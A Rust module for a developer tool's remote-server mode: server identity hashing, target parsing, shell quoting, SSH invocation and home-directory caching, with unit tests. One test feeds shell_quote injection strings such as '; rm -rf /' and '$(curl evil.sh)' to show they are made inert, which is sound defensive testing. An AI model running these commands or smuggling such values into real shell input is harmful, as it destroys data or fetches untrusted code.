//! Remote mode: identifying and remembering the servers a developer has set up.
//!
//! `Remote` names a server the way a developer typed it — host, port, and
//! login — and [`Remote::hash`] derives a stable key from those three answers
//! so the same server always finds the same SSH identity on disk
//! (`~/.riabuild/ssh-identities/<hash>`). The `store` submodule persists what
//! has already been set up, in `remotes.json`. Later tasks add provisioning
//! and the shell handoff on top of this.
//!
//! The two key questions are two submodules on purpose, and neither reaches
//! into the other's answer: `identity` owns the key that proves who *we* are
//! to a server, `host_key` owns the key that proves who the *server* is to
//! us. Confusing the second for the first is how a developer gets phished by
//! a box that isn't theirs.

// `unwrap_used` is denied workspace-wide. In tests a panic *is* the reporting
// mechanism for a failed precondition, so unwrapping a fixture there is
// correct and this keeps the deny from forcing ceremony into every test module.
#![cfg_attr(test, allow(clippy::unwrap_used))]

pub mod askpass;
pub mod authorise;
pub mod channel;
pub mod flow;
pub mod forget;
pub mod host_key;
pub mod identity;
pub mod install;
pub mod issued;
pub mod pick;
pub mod render;
pub mod seed;
pub mod session;
pub mod shared;
pub mod shell;
pub mod store;

pub use flow::{forget_server, list, run};

use anyhow::{Result, anyhow};
use riabuild_paths::Paths;
use riabuild_runner::{CommandOutput, CommandRunner};
use riabuild_ui::Failure;
use std::sync::Arc;

/// What `riabuild remote` needs from the command line, named rather than parsed.
///
/// The binary fills this in from `Cli`; nothing under `remote/` sees a clap
/// type. That is not tidiness — reaching into the global `Cli` meant this
/// module could read *any* flag rather than the ones its caller chose to hand
/// over, and `--accept-host-key` had to be dug out by matching `cli.command`
/// because it is scoped to the `remote` subcommand (R13 in `decisions.md`)
/// rather than being a top-level field. Named fields make both the inputs and
/// their scope obvious, and let the tests state a case directly instead of
/// round-tripping it through an argv they then have to parse.
#[derive(Debug, Clone, Default)]
pub struct Request {
    /// A saved server's name, or `[user@]host[:port]` to add one.
    pub target: Option<String>,
    /// The host key fingerprint to trust without prompting.
    pub accept_host_key: Option<String>,
    pub check: bool,
    pub quiet: bool,
    pub no_shell: bool,
    /// Where the checkout should live *on the server*, not on this laptop.
    pub project: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Remote {
    /// A local label only. The server never sees it.
    pub name: String,
    pub host: String,
    pub port: u16,
    pub user: String,
}

impl Remote {
    /// Identifies the server for key and session storage.
    ///
    /// Hashed over the *login target* — user, host, and port — never the local
    /// `name`, so renaming a saved server never changes which key it uses.
    ///
    /// Four normalisation axes, each considered deliberately rather than left
    /// to chance:
    ///
    /// - **Case.** The host is lowercased first (ASCII-only —
    ///   [`str::to_ascii_lowercase`], not [`str::to_lowercase`]: hostnames are
    ///   ASCII or punycode, so there is no Unicode case-folding to get right or
    ///   wrong here). DNS names are case-insensitive, so `Build-01.fly.dev` and
    ///   `build-01.fly.dev` are one server; hashing the host as typed would
    ///   silently re-provision and re-authorise a server the developer already
    ///   set up, the second time they typed it slightly differently.
    /// - **Trailing dot.** A single trailing `.` is stripped before lowercasing.
    ///   `build-01.fly.dev.` is the fully-qualified spelling of
    ///   `build-01.fly.dev` — DNS treats them as the identical name — and
    ///   without this, typing (or a tool emitting) the FQDN form would fork one
    ///   server into two SSH identities.
    /// - **Port.** No equivalent treatment is needed here: [`Remote::parse`]
    ///   already fills in `22` whenever a spec omits a port, so by the time a
    ///   `Remote` exists, `host:22` and a bare `host` have already become the
    ///   same `u16`. A caller who builds a `Remote` by hand is expected to have
    ///   resolved that the same way.
    /// - **IP vs. name.** Left un-normalised, on purpose. The hash is over the
    ///   login target *as the developer typed it*, not over a resolved
    ///   address — resolving `build-01.fly.dev` to an IP before hashing would
    ///   mean the identity (and which SSH key gets used) depends on whatever
    ///   DNS answers on a given day, which is exactly the kind of cleverness
    ///   this design avoids. `10.0.0.5` and `build-01.fly.dev` are treated as
    ///   two different servers even if they currently happen to be the same
    ///   machine; that is a feature, not a gap — predictable beats resolved.
    /// - The user is left exactly as typed. Unix usernames are case-sensitive,
    ///   and `ada` and `Ada` are two different accounts, not one.
    pub fn hash(&self) -> String {
        let host = self.host.strip_suffix('.').unwrap_or(&self.host);
        let key = format!("{}@{}:{}", self.user, host.to_ascii_lowercase(), self.port);
        let digest = riabuild_fetch::download::sha256_hex(key.as_bytes());
        digest[..16].to_string()
    }

    /// `user@host`, for `ssh`/`mosh`'s target argument.
    pub fn target(&self) -> String {
        format!("{}@{}", self.user, self.host)
    }

    /// `[user@]host[:port]`, with the local login as the default user.
    pub fn parse(spec: &str, default_user: &str) -> Result<Remote> {
        let spec = spec.trim();
        if spec.is_empty() {
            return Err(anyhow!("no server given"));
        }
        let (user, rest) = match spec.split_once('@') {
            Some((user, rest)) if !user.is_empty() => (user.to_string(), rest),
            Some(_) => return Err(anyhow!("that has an empty username in it")),
            None => (default_user.to_string(), spec),
        };
        let (host, port) = match rest.rsplit_once(':') {
            Some((host, port)) => {
                let port: u16 = port
                    .parse()
                    .map_err(|_| anyhow!("`{port}` is not a port number"))?;
                if port == 0 {
                    return Err(anyhow!("0 is not a port number"));
                }
                (host.to_string(), port)
            }
            None => (rest.to_string(), 22),
        };
        if host.is_empty() {
            return Err(anyhow!("that has no hostname in it"));
        }
        let name = store::allocate_name(&host, &[]);
        Ok(Remote {
            name,
            host,
            port,
            user,
        })
    }
}

// Commands a server actually runs.
//
// `sshd` hands whatever `ssh` sends it to the login shell configured for
// that account — `fish`, `csh`, `bash`, whatever the developer chose on
// that box — and `mosh` skips a shell entirely (`execvp`). So nothing built
// below may lean on POSIX-only syntax (`VAR=x cmd`, unquoted `~`) that only
// some of those accept: `shell_quote` makes a value inert regardless of
// which shell (if any) re-reads it, `shell_command` names the shell
// explicitly for anything that needs one, and `env_command` sets
// environment without shell syntax at all. `ssh_once` and `resolve_home`
// are what put them on the wire.

/// Single-quotes a value for a POSIX shell, so it survives intact as one
/// argument no matter what characters it contains. The same rule `main.rs`
/// already uses for `riabuild env`.
///
/// Single quotes admit no escape sequences at all — the only character that
/// needs special handling is the single quote itself, which cannot appear
/// inside a single-quoted string. The standard trick closes the quote, emits
/// an escaped literal quote outside it, then reopens: `it's` becomes
/// `'it'\''s'` — `'it'` + `\'` + `'s'`, concatenated by the shell back into
/// `it's`.
pub fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

/// Wraps a multi-step script so it runs under `/bin/sh`, whatever the
/// account's login shell happens to be — `fish` and `csh` do not speak
/// POSIX `sh` syntax, so a script written against it must say so explicitly
/// rather than rely on whatever the account defaults to.
pub fn shell_command(script: &str) -> String {
    format!("/bin/sh -c {}", shell_quote(script))
}

/// `env K=V … program args…`, with every part quoted.
///
/// No shell syntax at all — not even the `sh -c` wrapper `shell_command`
/// uses — so this is what survives fish and csh (which reject a bare
/// `VAR=value command` prefix as a syntax error) and mosh (which `execvp`s
/// the command with no shell to expand or interpret anything).
pub fn env_command(env: &[(&str, &str)], program: &str, args: &[&str]) -> String {
    let mut parts = vec!["env".to_string()];
    for (key, value) in env {
        parts.push(shell_quote(&format!("{key}={value}")));
    }
    parts.push(shell_quote(program));
    parts.extend(args.iter().map(|arg| shell_quote(arg)));
    parts.join(" ")
}

/// One command on the server, through the key riabuild owns for it.
pub async fn ssh_once(
    remote: &Remote,
    paths: &dyn Paths,
    runner: Arc<dyn CommandRunner>,
    command: &str,
) -> Result<CommandOutput> {
    let mut args = identity::ssh_options(remote, paths, true);
    args.push(remote.target());
    args.push(command.to_string());
    let refs: Vec<&str> = args.iter().map(String::as_str).collect();
    runner
        .run("ssh", &refs, &askpass::run_options(remote, paths))
        .await
}

/// The server's own home directory, asked for once and cached on the store
/// entry from then on.
///
/// Everything downstream of this uses the absolute string it returns,
/// never `~`: a `~` is only a home directory to a shell willing to expand
/// it, mosh runs commands with no shell at all, and an unexpanded `~` that
/// reached `paths::root_for` would be refused outright rather than
/// silently collapsing every developer on the box into one namespace.
///
/// **Caches in memory; never writes `remotes.json` itself.** This is the one
/// step `riabuild remote --check` runs that reaches the server, and a
/// `store.save` here made a read-only probe persist a full record — name,
/// host, port, user — for a machine the developer had only asked riabuild to
/// look at, which then read back from `riabuild remote list` as a server they
/// had set up. Persisting is left to the callers that know whether this run is
/// read-only: `flow::connect_and_setup` saves either side of this call on the
/// non-`--check` path — before `authorise`, which can modify the server, and
/// again here, because `forget`'s server-side cleanup needs the home this
/// resolved — and `session::ensure` and `store::remember` save again later.
pub async fn resolve_home(
    remote: &Remote,
    paths: &dyn Paths,
    runner: Arc<dyn CommandRunner>,
    store: &mut store::Store,
) -> Result<String> {
    if let Some(record) = store.find(&remote.name)
        && !record.home.is_empty()
    {
        return Ok(record.home.clone());
    }

    let output = ssh_once(remote, paths, runner, &shell_command("printf %s \"$HOME\"")).await?;
    let home = output.trimmed().to_string();
    if !output.ok() || !home.starts_with('/') {
        return Err(Failure::new(
            format!("asking {} where your home directory is", remote.host),
            "Check that you can `ssh` to that server yourself, then run `riabuild remote` again.",
        )
        .detail(output.stderr)
        .into());
    }

    if let Some(record) = store.remotes.iter_mut().find(|r| r.name == remote.name) {
        record.home = home.clone();
    }
    Ok(home)
}

/// The variable a cloudcli box reads to decide whether to wrap a session in
/// tmux, and the value that tells it not to.
///
/// riabuild opens the environment shell itself, and a profile that `exec`s
/// tmux in front of it takes the terminal riabuild is in the middle of handing
/// over: the banner, the accounts box and the `exit` that is supposed to end
/// the session all land inside a pane instead. Set as an *environment*
/// variable rather than written into a generated rcfile, because the rcfile
/// sources the developer's own config first and by then tmux has already
/// started — the answer has to be in the environment before any shell reads
/// anything.
///
/// A pair rather than two constants so the key and the value cannot be used
/// apart; [`env_prefix`] and [`shell::open`] are its two callers, and they set
/// it at different depths on purpose. See `shell::open` for why the mosh path
/// needs its own copy.
pub const NO_TMUX: (&str, &str) = ("CLOUDCLI_NO_TMUX", "1");

/// The environment the server's own riabuild runs under, as `(key, value)`
/// pairs ready for [`env_command`] — never a `VAR=x` prefix, which fish
/// rejects outright and which mosh never gives a shell the chance to parse
/// anyway.
///
/// `home` and `member_id` produce the absolute, tilde-free namespace
/// (`session::namespace`); `name` is the local label so the server's riabuild
/// can say which saved connection it is running under.
///
/// The channel socket is named here rather than left for the server to resolve,
/// and that is load-bearing rather than tidiness: several developers share one
/// Unix account on a server, so they share one uid and therefore one
/// `$XDG_RUNTIME_DIR`. A server working the path out for itself would give
/// every developer on the box the same `…/riabuild/channel.sock`, and Ada's
/// `xclip` would read Ben's laptop. Naming it also switches on
/// `shell::browser_for`, which exports `BROWSER` only where a channel exists to
/// open a link on.
///
/// [`NO_TMUX`] rides along here rather than being set anywhere further in,
/// because everything the server runs hangs off this prefix — the setup run,
/// the channel probe, `internal seed-github`, and the `riabuild shell` that
/// becomes the developer's session. `RealRunner` adds to the child's inherited
/// environment rather than replacing it, so a value set on the wire here is
/// still set for the bash riabuild spawns three processes later, before that
/// bash reads a line of the developer's own config.
pub fn env_prefix(home: &str, member_id: &str, name: &str) -> Vec<(String, String)> {
    let namespace = session::namespace(home, member_id);
    vec![
        ("RIABUILD_ROOT".to_string(), namespace.clone()),
        ("RIABUILD_REMOTE".to_string(), name.to_string()),
        (
            riabuild_channel::SOCKET_ENV.to_string(),
            channel::remote_socket(&namespace),
        ),
        (NO_TMUX.0.to_string(), NO_TMUX.1.to_string()),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_same_three_answers_always_produce_the_same_key() {
        // This is what makes the whole flow safe to re-run: a second
        // `riabuild remote` finds the key it made the first time.
        let one = Remote {
            name: "build-01".into(),
            host: "build-01.fly.dev".into(),
            port: 22,
            user: "ada".into(),
        };
        let two = Remote {
            name: "anything-else".into(),
            ..one.clone()
        };
        assert_eq!(
            one.hash(),
            two.hash(),
            "the local name is not part of identity"
        );
        assert_eq!(one.hash().len(), 16);
        assert!(one.hash().chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn a_different_user_or_port_is_a_different_server() {
        let base = Remote {
            name: "b".into(),
            host: "box".into(),
            port: 22,
            user: "ada".into(),
        };
        let other_user = Remote {
            user: "bob".into(),
            ..base.clone()
        };
        let other_port = Remote {
            port: 2222,
            ..base.clone()
        };
        let other_host = Remote {
            host: "otherbox".into(),
            ..base.clone()
        };
        assert_ne!(base.hash(), other_user.hash());
        assert_ne!(base.hash(), other_port.hash());
        assert_ne!(base.hash(), other_host.hash());
    }

    #[test]
    fn a_different_hostname_case_is_still_a_different_hash_from_a_different_host() {
        // Guards against a normalisation bug that would collapse two genuinely
        // different servers (not just two spellings of one) onto one hash.
        let a = Remote {
            name: "a".into(),
            host: "box-one".into(),
            port: 22,
            user: "ada".into(),
        };
        let b = Remote {
            name: "b".into(),
            host: "box-two".into(),
            port: 22,
            user: "ada".into(),
        };
        assert_ne!(a.hash(), b.hash());
    }

    #[test]
    fn differing_hostname_case_is_the_same_server() {
        // The other direction of the same invariant: two spellings of the
        // identical server must not fork into two SSH identities.
        let lower = Remote {
            name: "build-01".into(),
            host: "build-01.fly.dev".into(),
            port: 22,
            user: "ada".into(),
        };
        let mixed_case = Remote {
            host: "Build-01.Fly.Dev".into(),
            ..lower.clone()
        };
        let upper = Remote {
            host: "BUILD-01.FLY.DEV".into(),
            ..lower.clone()
        };
        assert_eq!(lower.hash(), mixed_case.hash());
        assert_eq!(lower.hash(), upper.hash());
    }

    #[test]
    fn a_trailing_dot_is_the_same_server() {
        // The fully-qualified spelling of a DNS name ends in `.`; DNS treats
        // `build-01.fly.dev` and `build-01.fly.dev.` as the identical name, and
        // a hash that didn't would fork one server into two SSH identities the
        // first time someone (or some tool) typed the FQDN form.
        let bare = Remote {
            name: "build-01".into(),
            host: "build-01.fly.dev".into(),
            port: 22,
            user: "ada".into(),
        };
        let fqdn = Remote {
            host: "build-01.fly.dev.".into(),
            ..bare.clone()
        };
        assert_eq!(bare.hash(), fqdn.hash());
    }

    #[test]
    fn an_explicit_default_port_is_the_same_server_as_no_port_at_all() {
        // The other normalisation this task cares about: `:22` spelled out and
        // no port at all must resolve to one identity, because they always will
        // once `Remote::parse` has filled in the default.
        let explicit = Remote::parse("ada@build-01.fly.dev:22", "ada").expect("parses");
        let implicit = Remote::parse("ada@build-01.fly.dev", "ada").expect("parses");
        assert_eq!(explicit.hash(), implicit.hash());
    }

    #[test]
    fn a_target_is_parsed_the_way_it_is_typed() {
        let parsed = Remote::parse("ada@build-01.fly.dev:2222", "local").expect("parses");
        assert_eq!(parsed.user, "ada");
        assert_eq!(parsed.host, "build-01.fly.dev");
        assert_eq!(parsed.port, 2222);
        assert_eq!(parsed.name, "build-01");

        let defaults = Remote::parse("build-01.fly.dev", "ada").expect("parses");
        assert_eq!(defaults.user, "ada");
        assert_eq!(defaults.port, 22);
    }

    #[test]
    fn nonsense_is_refused_rather_than_guessed_at() {
        assert!(Remote::parse("", "ada").is_err());
        assert!(Remote::parse("ada@", "ada").is_err());
        assert!(Remote::parse("host:not-a-port", "ada").is_err());
        assert!(Remote::parse("host:0", "ada").is_err());
        assert!(Remote::parse("host:99999", "ada").is_err());
    }

    fn remote() -> Remote {
        Remote {
            name: "build-01".into(),
            host: "build-01.fly.dev".into(),
            port: 22,
            user: "ada".into(),
        }
    }

    #[test]
    fn quoting_makes_a_hostile_value_inert() {
        assert_eq!(shell_quote("plain"), "'plain'");
        assert_eq!(shell_quote("with space"), "'with space'");
        // The one character that ends a single-quoted string, and the reason this
        // is a function rather than a format string at each call site.
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
        assert_eq!(shell_quote("; rm -rf /"), "'; rm -rf /'");
        assert_eq!(shell_quote("$(curl evil.sh)"), "'$(curl evil.sh)'");
        assert_eq!(shell_quote("a\nb"), "'a\nb'");
        // Backticks are the other command-substitution syntax POSIX shells
        // honour, and single quotes disable them exactly the same way.
        assert_eq!(shell_quote("`curl evil.sh`"), "'`curl evil.sh`'");
        // Not exploitable today — nothing in this module puts untrusted data
        // in flag position — but a quoted value can never be mistaken for a
        // flag by whatever reads it next, so it belongs on the hostile list.
        assert_eq!(shell_quote("-rf"), "'-rf'");
    }

    #[test]
    fn a_command_never_depends_on_the_login_shell() {
        // fish would reject a `VAR=x cmd` prefix outright, and mosh runs the command
        // with no shell at all, so `env` does the work instead.
        let command = env_command(
            &[
                ("RIABUILD_ROOT", "/home/dev/.riabuild-remote/abc"),
                ("RIABUILD_REMOTE", "build-01"),
            ],
            "/home/dev/.riabuild/riabuild/2026.08.06/riabuild",
            &["--no-shell"],
        );
        assert!(command.starts_with("env "), "{command}");
        assert!(
            command.contains("'RIABUILD_ROOT=/home/dev/.riabuild-remote/abc'"),
            "{command}"
        );
        assert!(!command.contains('~'), "{command}");

        // Multi-step scripts say which shell runs them.
        let script = shell_command("mkdir -p /tmp/x && cat > /tmp/x/y");
        assert!(script.starts_with("/bin/sh -c '"), "{script}");
    }

    #[test]
    fn the_remote_invocation_carries_an_absolute_namespace_and_the_server_name() {
        let env = env_prefix(
            "/home/dev",
            "550e8400-e29b-41d4-a716-446655440000",
            "build-01",
        );
        let command = env_command(
            &env.iter()
                .map(|(k, v)| (k.as_str(), v.as_str()))
                .collect::<Vec<_>>(),
            "/home/dev/.riabuild/riabuild/2026.08.06/riabuild",
            &["--no-shell"],
        );
        assert!(
            command.contains("/home/dev/.riabuild-remote/550e8400"),
            "{command}"
        );
        assert!(command.contains("RIABUILD_REMOTE=build-01"), "{command}");
        // A tilde here is the bug: root_for refuses it, and before it did, every
        // developer on the box silently shared one namespace.
        assert!(!command.contains('~'), "{command}");
    }

    #[test]
    fn the_channel_socket_is_named_inside_the_namespace_not_left_to_the_server() {
        // The shared-uid failure: developers on one account share one
        // `$XDG_RUNTIME_DIR`, so a server resolving its own path puts all of
        // them on one socket and one developer's paste reads another's laptop.
        let env = env_prefix(
            "/home/dev",
            "550e8400-e29b-41d4-a716-446655440000",
            "build-01",
        );
        let socket = env
            .iter()
            .find(|(key, _)| key == riabuild_channel::SOCKET_ENV)
            .map(|(_, value)| value.as_str())
            .expect("every remote invocation carries the socket");
        assert_eq!(
            socket,
            "/home/dev/.riabuild-remote/550e8400-e29b-41d4-a716-446655440000/channel.sock"
        );
        // The same namespace RIABUILD_ROOT gets, not a second spelling of it.
        let root = env
            .iter()
            .find(|(key, _)| key == "RIABUILD_ROOT")
            .map(|(_, value)| value.as_str())
            .expect("root");
        assert!(socket.starts_with(root), "{socket} is not under {root}");
    }

    /// Every remote invocation, not only the shell: the setup run hands the
    /// terminal over too, and a tmux that swallowed *that* would leave the
    /// developer watching a pane instead of a provisioning run.
    #[test]
    fn no_remote_invocation_lets_the_server_wrap_the_session_in_tmux() {
        let env = env_prefix(
            "/home/dev",
            "550e8400-e29b-41d4-a716-446655440000",
            "build-01",
        );
        assert_eq!(
            env.iter()
                .find(|(key, _)| key == NO_TMUX.0)
                .map(|(_, value)| value.as_str()),
            Some(NO_TMUX.1),
            "{env:?}"
        );

        // On the wire it is a quoted `env` argument like every other pair —
        // never a `VAR=x` prefix, which fish rejects and mosh never parses.
        let command = env_command(
            &env.iter()
                .map(|(k, v)| (k.as_str(), v.as_str()))
                .collect::<Vec<_>>(),
            "/home/dev/.riabuild/riabuild/2026.08.06/riabuild",
            &["shell"],
        );
        assert!(command.starts_with("env "), "{command}");
        assert!(command.contains("'CLOUDCLI_NO_TMUX=1'"), "{command}");
    }

    #[tokio::test]
    async fn the_servers_home_is_asked_for_once_and_remembered() {
        let home = tempfile::TempDir::new().expect("tempdir");
        let paths = riabuild_paths::RealPaths::rooted_at(home.path());
        let fake =
            Arc::new(riabuild_runner::FakeRunner::new().containing("printf", 0, "/home/dev\n", ""));
        let mut store = store::Store::default();
        store.remotes.push(store::record_for(&remote()));

        let first = resolve_home(&remote(), &paths, fake.clone(), &mut store)
            .await
            .expect("asks");
        assert_eq!(first, "/home/dev");
        assert_eq!(store.remotes[0].home, "/home/dev");

        let second = resolve_home(&remote(), &paths, fake.clone(), &mut store)
            .await
            .expect("cached");
        assert_eq!(second, "/home/dev");
        assert_eq!(
            fake.calls()
                .iter()
                .filter(|call| call.contains("printf"))
                .count(),
            1,
            "the second call must come from the record, not the server"
        );
        // Cached on the record, not written out: this is the only step
        // `riabuild remote --check` runs that reaches the server, and a save
        // here persisted a full record for a machine that had only been
        // probed. `session::ensure` and `store::remember` are what mean it.
        assert!(
            !paths.remotes_file().exists(),
            "resolving a home must not write remotes.json"
        );
    }

    #[tokio::test]
    async fn a_tilde_home_is_refused_rather_than_sent_to_root_for() {
        // This is the R1 mechanism: `paths::root_for` refuses a non-absolute
        // override rather than defaulting, so a `~` that reached it would
        // hard-error there instead of silently collapsing every developer on
        // a shared box into one namespace. `resolve_home` must catch it
        // first, with an actionable message, rather than caching a `~` that
        // later commands would carry unexpanded.
        let home = tempfile::TempDir::new().expect("tempdir");
        let paths = riabuild_paths::RealPaths::rooted_at(home.path());
        let fake = Arc::new(riabuild_runner::FakeRunner::new().containing("printf", 0, "~\n", ""));
        let mut store = store::Store::default();
        store.remotes.push(store::record_for(&remote()));

        let err = resolve_home(&remote(), &paths, fake, &mut store)
            .await
            .expect_err("a `~` is not an absolute path");
        assert!(
            err.downcast_ref::<Failure>().is_some(),
            "must be the actionable Failure, not a generic error: {err}"
        );
        assert!(
            store.remotes[0].home.is_empty(),
            "a refused home must not be cached"
        );
    }

    #[tokio::test]
    async fn a_relative_home_is_refused_rather_than_sent_to_root_for() {
        // The other shape a non-absolute `$HOME` can take: no leading `/` and
        // no `~` either, just a bare relative path.
        let home = tempfile::TempDir::new().expect("tempdir");
        let paths = riabuild_paths::RealPaths::rooted_at(home.path());
        let fake = Arc::new(riabuild_runner::FakeRunner::new().containing(
            "printf",
            0,
            "relative/path\n",
            "",
        ));
        let mut store = store::Store::default();
        store.remotes.push(store::record_for(&remote()));

        let err = resolve_home(&remote(), &paths, fake, &mut store)
            .await
            .expect_err("a relative path is not an absolute path");
        assert!(
            err.downcast_ref::<Failure>().is_some(),
            "must be the actionable Failure, not a generic error: {err}"
        );
    }
}
